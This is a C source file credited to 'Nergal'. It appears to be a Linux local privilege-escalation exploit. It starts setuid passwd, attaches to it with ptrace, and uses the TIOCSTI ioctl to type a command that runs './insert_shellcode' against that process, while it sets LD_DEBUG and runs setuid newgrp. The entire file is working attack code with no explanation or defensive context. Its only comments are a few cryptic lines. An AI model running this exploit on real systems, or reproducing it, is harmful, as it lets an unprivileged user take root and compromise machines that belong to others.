/* by Nergal */
#include <stdio.h>
#include <sys/ptrace.h>
#include <fcntl.h>
#include <sys/ioctl.h>
void ex_passwd(int fd)
{
	char z;
	if (read(fd, &z, 1) <= 0) {
		perror("read:");
		exit(1);
	}
	execl("/usr/bin/passwd", "passwd", 0);
	perror("execl");
	exit(1);
}
void insert(int pid)
{
	char buf[100];
	char *ptr = buf;
	sprintf(buf, "exec ./insert_shellcode %i\n", pid);
	while (*ptr && !ioctl(0, TIOCSTI, ptr++));
}


main(int argc, char **argv)
{
	int res, fifo;
	int status;
	int pid, n;
	int pipa[2];
	char buf[1024];
	pipe(pipa);
	switch (pid = fork()) {
	case -1:
		perror("fork");
		exit(1);
	case 0:
		close(pipa[1]);
		ex_passwd(pipa[0]);
	default:;
	}


	res = ptrace(PTRACE_ATTACH, pid, 0, 0);
	if (res) {
		perror("attach");
		exit(1);
	}
	res = waitpid(-1, &status, 0);
	if (res == -1) {
		perror("waitpid");
		exit(1);
	}
	res = ptrace(PTRACE_CONT, pid, 0, 0);
	if (res) {
		perror("cont");
		exit(1);
	}
	fprintf(stderr, "attached\n");
	switch (fork()) {
	case -1:
		perror("fork");
		exit(1);
	case 0:
		close(pipa[1]);
		sleep(1);
		insert(pid);
		do {
			n = read(pipa[0], buf, sizeof(buf));
		} while (n > 0);
		if (n < 0)
			perror("read");
		exit(0);
	default:;
	}
	close(pipa[0]);

	dup2(pipa[1], 2);
	close(pipa[1]);
	/* Decrystallizing reason */
	setenv("LD_DEBUG", "libs", 1);
	/* With strength I burn */ 
	execl("/usr/bin/newgrp", "newgrp", 0);
}
